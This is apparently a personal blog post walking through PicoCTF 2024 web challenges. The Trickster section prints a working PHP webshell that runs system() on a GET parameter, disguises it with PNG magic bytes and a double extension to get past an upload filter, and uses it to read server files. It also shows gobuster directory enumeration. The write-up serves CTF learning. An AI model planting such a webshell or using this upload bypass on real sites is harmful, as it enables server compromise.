<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="default-src 'self';font-src 'self' data:;img-src 'self' https://* data:;media-src 'self';style-src 'self';frame-src player.vimeo.com https://www.youtube-nocookie.com;connect-src 'self' rylie.goatcounter.com/count 'self' https://*;script-src 'self' gc.zgo.at 'self'" http-equiv=Content-Security-Policy><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content=https://rylie.moe name=base><title>
PicoCTF 2024: Web Exploitation | lumi's trashcan</title><link href=https://rylie.moe/favicon.ico rel=icon type=image/png><link title="lumi's trashcan - Atom Feed" href=https://rylie.moe/atom.xml rel=alternate type=application/atom+xml><link href="https://rylie.moe/custom_subset.css?h=0b9535a28bc3d5bf2321" rel=stylesheet><link href="https://rylie.moe/main.css?h=9ba37545587e359ed117" rel=stylesheet><link href="https://rylie.moe/skins/sakura.css?h=2d9c69af51135683e3bd" rel=stylesheet><meta content="light dark" name=color-scheme><meta content="my thoughts and rants." name=description><meta content="my thoughts and rants." property=og:description><meta content="PicoCTF 2024: Web Exploitation" property=og:title><meta content=article property=og:type><meta content=en_GB property=og:locale><meta content=https://rylie.moe/blog/picoctf-2024-web/ property=og:url><meta content="lumi's trashcan" property=og:site_name><noscript><link href=https://rylie.moe/no_js.css rel=stylesheet></noscript><script src=https://rylie.moe/js/initializeTheme.min.js></script><script defer src=https://rylie.moe/js/themeSwitcher.min.js></script><script async data-goatcounter=https://rylie.goatcounter.com/count src=https://gc.zgo.at/count.js></script><script src="https://rylie.moe/js/searchElasticlunr.min.js?h=3626c0ef99daa745b31e" defer></script><body><header><nav class=navbar><div class=nav-title><a class=home-title href=https://rylie.moe>lumi's trashcan</a></div><div class=nav-navs><ul><li><a class="nav-links no-hover-padding" href=https://rylie.moe/blog/>blog </a><li><a class="nav-links no-hover-padding" href=https://rylie.moe/archive/>archive </a><li><a class="nav-links no-hover-padding" href=https://rylie.moe/tags/>tags </a><li><a class="nav-links no-hover-padding" href=https://rylie.moe/projects/>projects </a><li class=menu-icons-container><ul class=menu-icons-group><li class="js menu-icon"><div aria-label="Click or press $SHORTCUT to open search" class="search-icon interactive-icon" title="Click or press $SHORTCUT to open search" id=search-button role=button tabindex=0><svg viewbox="0 -960 960 960" xmlns=http://www.w3.org/2000/svg><path d="M784-120 532-372q-30 24-69 38t-83 14q-109 0-184.5-75.5T120-580q0-109 75.5-184.5T380-840q109 0 184.5 75.5T640-580q0 44-14 83t-38 69l252 252-56 56ZM380-400q75 0 127.5-52.5T560-580q0-75-52.5-127.5T380-760q-75 0-127.5 52.5T200-580q0 75 52.5 127.5T380-400Z"/></svg></div><li class="theme-switcher-wrapper js"><div aria-label="Toggle dark mode" title="Toggle dark/light mode" aria-pressed=false class=theme-switcher role=button tabindex=0></div><div aria-label="Reset mode to default" class="theme-resetter arrow" title="Reset mode to default" aria-hidden=true role=button tabindex=0></div></ul></ul></div></nav></header><div class=content><main><article><h1 class=article-title>PicoCTF 2024: Web Exploitation</h1><ul class=meta><li>2nd Aug 2024<li title="942 words"><span aria-hidden=true class=separator>|</span>5 min read<li class=tag><span aria-hidden=true class=separator>|</span>Tags: <li class=tag><a href=https://rylie.moe/tags/picoctf/>picoctf</a>, <li class=tag><a href=https://rylie.moe/tags/coding/>coding</a>, <li class=tag><a href=https://rylie.moe/tags/ctf/>ctf</a>, <li class=tag><a href=https://rylie.moe/tags/web/>web</a></ul><div class=toc-container><h3>Table of Contents</h3><ul><li><a href=https://rylie.moe/blog/picoctf-2024-web/#webdecode>WebDecode</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#unminify>Unminify</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#bookmarklet>Bookmarklet</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#introtoburp>IntroToBurp</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#trickster>Trickster</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#afterwords>Afterwords</a></ul></div><section class=body><p>I have considered myself… practically done with the Forensics category for PicoCTF 2024. It truly is a guessfest whether or not your first solution is correct - I can’t believe throwing out a random <code>find</code> into the command-line actually gave me the answer for <a href=https://rylie.moe/blog/picoctf-2024-web/picoctf-2024-forensics#mob-psycho>Mob psycho</a>…<p>Well, here we go again, this time in my arguably best non-forensics category - Web Exploitation! Once again, I will be going through each of the challenges and solving them, while writing out my thought process for each challenge.<blockquote><p>Same thing as Forensics, this blogpost will describe the challenges and give the solutions to them - but I will not be giving out the flag in its entirety. All solutions with the flag in plain text will have the flag replaced by <code>picoCTF{flag}</code>.</blockquote><h1 id=webdecode><a aria-label="Anchor link for: webdecode" class="header-anchor no-hover-padding" href=#webdecode><span aria-hidden=true class=link-icon></span></a> WebDecode</h1><blockquote><p><strong>Difficulty</strong>: Easy <br> <strong>Categories</strong>: none</blockquote><p>Well… We’re thrown straight into a website that looks <em>really</em> suspicious. I’ll perform due dilligence and… inspect the site HTML. Nothing in the home page, so I’ll go into the About page.<p>And upon loading the About page, wow, the <strong>very loud</strong> text saying “Try inspecting the page!! You might find it there” really confirms that I’m getting somewhere.<p>Hitting F12 to open up my DevTools and I immediately see a weird section of HTML:<pre class="language-html z-code" data-lang=html><code class=language-html data-lang=html><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-any z-html">section</span> <span class="z-meta z-attribute-with-value z-class z-html"><span class="z-entity z-other z-attribute-name z-class z-html">class</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span></span><span class="z-string z-quoted z-double z-html"><span class="z-meta z-class-name z-html">about</span><span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">notify_true</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span><span class="z-text z-html z-basic">   <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-any z-html">h1</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span><span class="z-text z-html z-basic">    Try inspecting the page!! You might find it there
</span><span class="z-text z-html z-basic">   <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-any z-html">h1</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span><span class="z-text z-html z-basic">   <span class="z-comment z-block z-html"><span class="z-punctuation z-definition z-comment z-begin z-html">&LT!--</span> .about-container <span class="z-punctuation z-definition z-comment z-end z-html">--></span></span>
</span><span class="z-text z-html z-basic">  <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-any z-html">section</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></code></pre><p>That string looks very suspicious. One quick run into the base64 decoder again, using:<pre class=z-code><code><span class="z-text z-plain">$ echo "cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9" | base64 -d
</span></code></pre><p>Aaaaaaaaand we’ve got it! Very simple challenge.<h1 id=unminify><a aria-label="Anchor link for: unminify" class="header-anchor no-hover-padding" href=#unminify><span aria-hidden=true class=link-icon></span></a> Unminify</h1><blockquote><p><strong>Difficulty</strong>: Easy <br> <strong>Categories</strong>: obfuscation, minification</blockquote><p>Yet another webpage, similar to <a href=https://rylie.moe/blog/picoctf-2024-web/#webdecode>WebDecode</a> above. Once again, let’s open up our DevTools and scan through the HTML.<p>It didn’t take long before I reached this section of HTML:<pre class="language-html z-code" data-lang=html><code class=language-html data-lang=html><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-any z-html">p</span> <span class="z-meta z-attribute-with-value z-class z-html"><span class="z-entity z-other z-attribute-name z-class z-html">class</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span></span><span class="z-string z-quoted z-double z-html"><span class="z-meta z-class-name z-html">picoCTF{flag}</span><span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-any z-html">p</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></code></pre><p>That’s our flag, time to copy it and submit it.<h1 id=bookmarklet><a aria-label="Anchor link for: bookmarklet" class="header-anchor no-hover-padding" href=#bookmarklet><span aria-hidden=true class=link-icon></span></a> Bookmarklet</h1><blockquote><p><strong>Difficulty</strong>: Easy <br> <strong>Categories</strong>: obfuscation, browser</blockquote><p>The website gives us another site, in the same template as <a href=https://rylie.moe/blog/picoctf-2024-web/#unminify>Unminify</a>. It also gives us a JavaScript bookmarklet to run as well. As it describes itself, it’s a bookmarklet - very similar to my Kamaitachi maimai DX <a class=external href=https://github.com/j1nxie/kt-maimaidx-site-importer>import script</a>. Let’s create a quick bookmark and throw this in as the URL.<p>As soon as we click the bookmarklet, the flag shows up as an alert!<h1 id=introtoburp><a aria-label="Anchor link for: introtoburp" class="header-anchor no-hover-padding" href=#introtoburp><span aria-hidden=true class=link-icon></span></a> IntroToBurp</h1><blockquote><p><strong>Difficulty</strong>: Easy <br> <strong>Categories</strong>: none</blockquote><p>Well, as described by the challenge name, we’ll need <a class=external href=https://portswigger.net/burp>BurpSuite</a> for this. Let’s pull up BurpSuite and open the website in BurpSuite’s browser (Proxy > Intercept > Turn on Intercept).<p>We see a little form that tells us to put our information in, and being the sane person that I am, I will put in my fully 100% real information into this.<p><img alt="Screenshot of IntroToBurp form" src=/image/picoctf/introtoburp1.png><p>Hitting the Register button, while forwarding the packet as-is to the server, brings us to another form.<p><img alt="Screenshot of IntroToBurp 2FA" src=/image/picoctf/introtoburp2.png><p>It’s asking for an OTP code… but I haven’t received anything. Weird. Let’s try throwing in a random string… like <code>a</code> and submit it. BurpSuite nicely catches that request for us, and we can see the form data <code>otp=a</code> in the raw request packet. Let’s try… removing that and see what happens!<p>After removing the OTP code from the form data, we got ourselves a nice malformed… well… form data sent over the wire. Let’s see how the server reacts… And we got our flag!<h1 id=trickster><a aria-label="Anchor link for: trickster" class="header-anchor no-hover-padding" href=#trickster><span aria-hidden=true class=link-icon></span></a> Trickster</h1><blockquote><p><strong>Difficulty</strong>: Medium <br> <strong>Categories</strong>: none</blockquote><p>This is actually… a pretty tough one if you don’t know where to immediately start. I opened up the site that the challenge gave, and there was no clear entry points to… anything, really. Uploading a PNG only gets a result string shown to you, like below.<p><img alt="Screenshot of Trickster form" src=/image/picoctf/trickster1.png><p>I tried accessing a random directory, e.g. <code>atlas.picoctf.net:&LTport>/what</code>, and I got a 404 Not Found. That’s expected. I also see this is running Apache, which means… there’s PHP. But we haven’t seen any clear entry points to get an arbitrary PHP script running here.<p>Let’s get back to the root site. Sitting here won’t do us any good, I guess it’s time to use some tools? Using <code>gobuster</code>, and running a brute-force for URIs like such:<pre class=z-code><code><span class="z-text z-plain">$ gobuster dir --url http://atlas.picoctf.net:&LTport>/ --wordlist /usr/share/wordlists/dirb/big.txt
</span><span class="z-text z-plain">===============================================================
</span><span class="z-text z-plain">Gobuster v3.6
</span><span class="z-text z-plain">by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
</span><span class="z-text z-plain">===============================================================
</span><span class="z-text z-plain">[+] Url:                     http://atlas.picoctf.net:&LTport>/
</span><span class="z-text z-plain">[+] Method:                  GET
</span><span class="z-text z-plain">[+] Threads:                 10
</span><span class="z-text z-plain">[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
</span><span class="z-text z-plain">[+] Negative Status codes:   404
</span><span class="z-text z-plain">[+] User Agent:              gobuster/3.6
</span><span class="z-text z-plain">[+] Timeout:                 10s
</span><span class="z-text z-plain">===============================================================
</span><span class="z-text z-plain">Starting gobuster in directory enumeration mode
</span><span class="z-text z-plain">===============================================================
</span><span class="z-text z-plain">/.htaccess            (Status: 403) [Size: 285]
</span><span class="z-text z-plain">/.htpasswd            (Status: 403) [Size: 285]
</span><span class="z-text z-plain">/robots.txt           (Status: 200) [Size: 62]
</span><span class="z-text z-plain">/server-status        (Status: 403) [Size: 285]
</span><span class="z-text z-plain">/uploads              (Status: 301) [Size: 333] [--> http://atlas.picoctf.net:49884/uploads/]
</span><span class="z-text z-plain">Progress: 20469 / 20470 (100.00%)
</span><span class="z-text z-plain">===============================================================
</span><span class="z-text z-plain">Finished
</span><span class="z-text z-plain">===============================================================
</span></code></pre><p>We’re seeing <code>robots.txt</code> that we can access, and <code>/uploads</code> being redirected to the root directory - looks like there’s gonna be an accessible folder there. Let’s try accessing <code>robots.txt</code>…<pre class=z-code><code><span class="z-text z-plain">User-agent: *
</span><span class="z-text z-plain">Disallow: /instructions.txt
</span><span class="z-text z-plain">Disallow: /uploads/
</span></code></pre><p>So the <em>very root</em> directory of <code>/uploads/</code> is not crawled, along with the file <code>instructions.txt</code>. Let’s try looking at <code>instructions.txt</code>.<pre class=z-code><code><span class="z-text z-plain">Let's create a web app for PNG Images processing.
</span><span class="z-text z-plain">It needs to:
</span><span class="z-text z-plain">Allow users to upload PNG images
</span><span class="z-text z-plain">	look for ".png" extension in the submitted files
</span><span class="z-text z-plain">	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
</span><span class="z-text z-plain">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
</span></code></pre><p>Interesting… It looks like this doesn’t do much validation on the PNG files themselves, other than checking for the <code>.png</code> extension <em>existing</em> in the file name, and the first few bytes containing <code>PNG</code>. I guess the uploaded files will also be stored under <code>/uploads/&LTfile_name></code>? That’s an entry for our PHP now, no?<p>I will modify <a class=external href=https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985>easy-simple-php-webshell</a> a tiny bit, so it has the magic bytes for PNG at the top.<pre class="language-php z-code" data-lang=php><code class=language-php data-lang=php><span class="z-embedding z-php"><span class="z-text z-html z-basic">PNG
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-structure z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-structure z-any z-html">html</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-structure z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-structure z-any z-html">body</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-form z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-form z-html">form</span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">method</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>GET<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">name</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span><span class="z-meta z-embedded z-line z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-line z-php"><span class="z-source z-php"> <span class="z-support z-function z-construct z-php">echo</span> <span class="z-meta z-function-call z-php"><span class="z-support z-function z-file z-php">basename</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-safer z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_SERVER</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">PHP_SELF</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span> </span><span class="z-punctuation z-section z-embedded z-end z-php">?></span></span><span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-inline z-form z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-inline z-form z-html">input</span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">type</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>TEXT<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">name</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>cmd<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">autofocus</span> </span><span class="z-meta z-attribute-with-value z-id z-html"><span class="z-entity z-other z-attribute-name z-id z-html">id</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span></span><span class="z-string z-quoted z-double z-html"><span class="z-meta z-toc-list z-id z-html">cmd</span><span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">size</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>80<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-inline z-form z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-inline z-form z-html">input</span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">type</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>SUBMIT<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span> <span class="z-meta z-attribute-with-value z-html"><span class="z-entity z-other z-attribute-name z-html">value</span><span class="z-punctuation z-separator z-key-value z-html">=</span><span class="z-string z-quoted z-double z-html"><span class="z-punctuation z-definition z-string z-begin z-html">"</span>Execute<span class="z-punctuation z-definition z-string z-end z-html">"</span></span></span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-form z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-form z-html">form</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html"><</span><span class="z-entity z-name z-tag z-block z-any z-html">pre</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&LT?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-keyword z-control z-php">if</span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-meta z-function-call z-php"><span class="z-support z-function z-construct z-php">isset</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_GET</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">cmd</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-punctuation z-section z-block z-begin z-php">{</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-meta z-function-call z-php"><span class="z-support z-function z-exec z-php">system</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-global z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>_GET</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">cmd</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">'</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"> </span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">2>&1</span><span class="z-punctuation z-definition z-string z-end z-php">'</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-punctuation z-section z-block z-end z-php">}</span>
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?></span><span class="z-meta z-html-newline-after-php z-php">
</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-block z-any z-html">pre</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-structure z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-structure z-any z-html">body</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-structure z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&LT/</span><span class="z-entity z-name z-tag z-structure z-any z-html">html</span><span class="z-punctuation z-definition z-tag z-end z-html">></span></span>
</span></span></code></pre><p>Along with that, I’ll add the <code>.png</code> extension, saving it as <code>webshell.png.php</code> so it passes the extension check. Let’s try uploading this. The form accepted it without any complaints! Time to try accessing this webshell under <code>/uploads/webshell.png.php</code>.<p>We’re in. Let’s try running <code>ls ../</code> to see the root directory. There’s a weird file with the name <code>MQZWCYZWGI2WE.txt</code>. A simple <code>cat</code> on this file finally gives us the flag we’re looking for!<h1 id=afterwords><a aria-label="Anchor link for: afterwords" class="header-anchor no-hover-padding" href=#afterwords><span aria-hidden=true class=link-icon></span></a> Afterwords</h1><p>The final challenge of this category - titled “elements”, honestly deserves a post of its own. It’s of another level, and I’ve never seen myself so stuck on one. With that being said, that’s practically all the solvable web challenges for PicoCTF 2024 as of writing this post. Thank you all for reading through to the end!</section></article></main><div id=button-container><div id=toc-floating-container><input class=toggle id=toc-toggle type=checkbox><label class=overlay for=toc-toggle></label><label title="Toggle Table of Contents" class=button for=toc-toggle id=toc-button><svg viewbox="0 -960 960 960" xmlns=http://www.w3.org/2000/svg><path d="M414.82-193.094q-18.044 0-30.497-12.32-12.453-12.319-12.453-30.036t12.453-30.086q12.453-12.37 30.497-12.37h392.767q17.237 0 29.927 12.487 12.69 12.486 12.69 30.203 0 17.716-12.69 29.919t-29.927 12.203H414.82Zm0-244.833q-18.044 0-30.497-12.487Q371.87-462.9 371.87-480.45t12.453-29.92q12.453-12.369 30.497-12.369h392.767q17.237 0 29.927 12.511 12.69 12.512 12.69 29.845 0 17.716-12.69 30.086-12.69 12.37-29.927 12.37H414.82Zm0-245.167q-18.044 0-30.497-12.32t-12.453-30.037q0-17.716 12.453-30.086 12.453-12.369 30.497-12.369h392.767q17.237 0 29.927 12.486 12.69 12.487 12.69 30.203 0 17.717-12.69 29.92-12.69 12.203-29.927 12.203H414.82ZM189.379-156.681q-32.652 0-55.878-22.829t-23.226-55.731q0-32.549 23.15-55.647 23.151-23.097 55.95-23.097 32.799 0 55.313 23.484 22.515 23.484 22.515 56.246 0 32.212-22.861 54.893-22.861 22.681-54.963 22.681Zm0-245.167q-32.652 0-55.878-23.134-23.226-23.135-23.226-55.623 0-32.487 23.467-55.517t56.12-23.03q32.102 0 54.721 23.288 22.62 23.288 22.62 55.775 0 32.488-22.861 55.364-22.861 22.877-54.963 22.877Zm-.82-244.833q-32.224 0-55.254-23.288-23.03-23.289-23.03-55.623 0-32.333 23.271-55.364 23.272-23.03 55.495-23.03 32.224 0 55.193 23.288 22.969 23.289 22.969 55.622 0 32.334-23.21 55.364-23.21 23.031-55.434 23.031Z"/></svg></label><div class=toc-content><div class=toc-container><ul><li><a href=https://rylie.moe/blog/picoctf-2024-web/#webdecode>WebDecode</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#unminify>Unminify</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#bookmarklet>Bookmarklet</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#introtoburp>IntroToBurp</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#trickster>Trickster</a><li><a href=https://rylie.moe/blog/picoctf-2024-web/#afterwords>Afterwords</a></ul></div></div></div><a title="Go to the top of the page" class=no-hover-padding href=# id=top-button> <svg viewbox="0 0 20 20" fill=currentColor><path d="M3.293 9.707a1 1 0 010-1.414l6-6a1 1 0 011.414 0l6 6a1 1 0 01-1.414 1.414L11 5.414V17a1 1 0 11-2 0V5.414L4.707 9.707a1 1 0 01-1.414 0z"/></svg> </a></div><span class=hidden id=copy-success> Copied! </span><span class=hidden id=copy-init> Copy code to clipboard </span><script defer src=https://rylie.moe/js/copyCodeToClipboard.min.js></script></div><footer><section><nav class="socials nav-navs"><ul><li><a class="nav-links no-hover-padding social" href=https://rylie.moe/atom.xml> <img alt=feed loading=lazy src=https://rylie.moe/social_icons/rss.svg title=feed> </a><li><a class="nav-links no-hover-padding social" rel=" me" href=https://github.com/j1nxie> <img alt=github loading=lazy src=https://rylie.moe/social_icons/github.svg title=github> </a><li><a class="nav-links no-hover-padding social" rel=" me" href=https://steamcommunity.com/id/cauvong-chan> <img alt=steam loading=lazy 